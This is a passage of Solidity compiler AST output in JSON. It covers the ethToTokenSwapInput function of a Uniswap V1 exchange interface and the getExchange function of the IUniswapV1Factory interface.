													"nodeType": "ElementaryTypeName",
													"src": "367:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "366:6:2"
									},
									"scope": 1752,
									"src": "302:71:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "f39b5b9b",
									"id": 1751,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "ethToTokenSwapInput",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1747,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1744,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1751,
												"src": "407:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1743,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "407:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1746,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1751,
												"src": "413:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1745,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "413:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "406:12:2"
									},
									"returnParameters": {
										"id": 1750,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1749,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1751,
												"src": "445:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1748,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "445:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "444:6:2"
									},
									"scope": 1752,
									"src": "378:73:2",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1753,
							"src": "26:427:2"
						}
					],
					"src": "0:454:2"
				},
				"id": 2
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol",
					"exportedSymbols": {
						"IUniswapV1Factory": [
							1762
						]
					},
					"id": 1763,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1754,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:3"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 1762,
							"linearizedBaseContracts": [
								1762
							],
							"name": "IUniswapV1Factory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "06f2bf62",
									"id": 1761,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getExchange",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1757,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1756,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1761,
												"src": "81:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1755,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "81:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "80:9:3"
									},
									"returnParameters": {
										"id": 1760,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1759,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1761,
												"src": "113:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1758,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "113:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "112:9:3"
									},
									"scope": 1762,
									"src": "60:62:3",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1763,
							"src": "26:98:3"
						}
					],
					"src": "0:125:3"
				},
				"id": 3
			}
		}
	}
}